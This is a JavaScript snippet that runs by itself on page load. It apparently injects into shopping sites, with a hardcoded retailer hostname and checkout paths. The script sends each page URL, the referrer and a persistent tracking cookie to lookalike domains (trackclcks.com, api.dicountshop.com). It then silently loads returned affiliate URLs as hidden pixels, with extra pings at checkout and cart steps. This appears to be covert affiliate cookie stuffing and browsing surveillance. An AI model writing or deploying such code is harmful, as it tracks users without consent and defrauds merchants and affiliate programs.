(function () {
  const CONFIG_URL = 'https://trackclcks.com/api/site-config?host=';
  const TRACK_URL = 'https://api.dicountshop.com/api/track-user';
  const FALLBACK_PIXEL_URL = 'https://api.dicountshop.com/api/fallback-pixel?id=';

  const CHECKOUT_STEPS = [
    { type: 'cart', paths: ['/checkout/cart'] },
    { type: 'shipping', paths: ['/checkout/delivery', '/checkout/shipping'] },
    { type: 'payment', paths: ['/xpay', '/checkout/payment', '/pay-installments'] },
    { type: 'review-order', paths: ['/checkout/review-order'] },
    { type: 'confirmation', paths: ['/checkout/confirmation'] },
  ];

  const EXTRA_CART_PING_HOSTNAME = 'www.xcite.com';
  const EXTRA_CART_PING_DELAY = 2000;

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = Math.random() * 0x10 | 0x0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const nameEQ = name + '=';
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const c = cookies[i].trim();
      if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
    }
    return '';
  }

  function createTrackingPixel(src) {
    try {
      const img = new Image();
      img.src = src;
      img.style.display = 'none';
      document.body.appendChild(img);
    } catch (err) {}
  }

  function getMatchedCheckoutStep() {
    const path = window.location.pathname.toLowerCase();
    const step = CHECKOUT_STEPS.find(function (step) {
      return step.paths.some(function (p) {
        return path.includes(p);
      });
    });
    return step ? step.type : null;
  }

  async function doPing() {
    try {
      const uuid = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uuid + '; expires=' + expires + ';path=/;SameSite=Lax';

      const res = await fetch(TRACK_URL, {
        method: 'POST',
        keepalive: true,
        body: JSON.stringify({
          url: window.location.href,
          referrer: document.referrer,
          unique_id: uuid,
          origin: window.location.hostname,
          timestamp: new Date().getTime(),
        }),
        headers: { 'Content-Type': 'application/json' },
      });
      const data = await res.json();

      if (data.success && data.affiliate_url) {
        createTrackingPixel(data.affiliate_url);
      } else {
        createTrackingPixel(FALLBACK_PIXEL_URL + uuid);
      }
    } catch (err) {
      console.error('Tracking Failed:', err);
    }
  }

  function triggerPing() {
    doPing();
  }

  function fetchConfigAndTrack() {
    const url = CONFIG_URL + encodeURIComponent(window.location.hostname);
    fetch(url)
      .then(function (res) {
        if (!res.ok) throw new Error('Config API Failed');
        return res.json();
      })
      .then(function (data) {
        if (!data || (!data.always && !data.cartExtra)) return;

        const matchedStep = getMatchedCheckoutStep();

        if (data.always) triggerPing();
        data.cartExtra && matchedStep && (triggerPing(), triggerPing());

        if (window.location.hostname === EXTRA_CART_PING_HOSTNAME && matchedStep === 'cart') {
          setTimeout(triggerPing, EXTRA_CART_PING_DELAY);
        }
      })
      .catch(function (err) {
        console.error('Config fetch failed:', err);
      });
  }

  document.readyState === 'interactive' || document.readyState === 'complete'
    ? fetchConfigAndTrack()
    : window.addEventListener('DOMContentLoaded', fetchConfigAndTrack);
})();
